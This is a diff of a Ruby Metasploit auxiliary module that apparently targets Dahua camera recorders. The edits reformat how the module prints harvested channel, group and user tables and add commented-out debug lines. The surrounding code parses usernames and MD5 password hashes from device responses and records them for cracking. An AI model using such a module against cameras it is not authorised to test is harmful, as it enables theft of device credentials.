@@ -194,10 +194,10 @@ class Metasploit3 < Msf::Auxiliary
     print_good("#{peer} -- camera channels:")
     data.each_with_index do |val, index|
       number = index.to_s
-      channels = val[/([[:print:]]+)/].to_s
-      channels_table << [ number, channels ]
-      channels_table.print
+      channels = val[/([[:print:]]+)/]
+      channels_table << [ "#{number}", "#{channels}" ]
     end
+    channels_table.print
   end
 
   def grab_users
@@ -216,8 +216,12 @@ class Metasploit3 < Msf::Auxiliary
       usercount += 1
       user, md5hash, rights, name = val.match(/^.*:(.*):(.*):.*:(.*):(.*):.*$/).captures
       users_table << [user, md5hash, rights, name]
-      users_table.print
-      # print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
+      # puts user.class
+      # puts md5hash.class
+      # puts rights.class
+      # puts name.class
+      # users_table.print
+      print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
       # Write the dahua hash to the database
       hash = "#{rhost} #{user}:$dahua$#{md5hash}"
       report_hash(rhost, rport, user, hash)
@@ -245,12 +249,14 @@ class Metasploit3 < Msf::Auxiliary
       'Columns' => ['Number', 'Group']
     )
     print_good("#{peer} -- groups:")
-    data.each { |val|
-      number = val[/(([\d]+))/].to_i
-      groups = val[/(([a-z]+))/].to_i
+    data.each do |val|
+      number = "#{val[/(([\d]+))/]}"
+      groups = "#{val[/(([a-z]+))/]}"
+      # puts number.class
+      # puts groups.class
       groups_table << [ number, groups ]
       groups_table.print
-    }
+    end
   end
 
   def reset_user
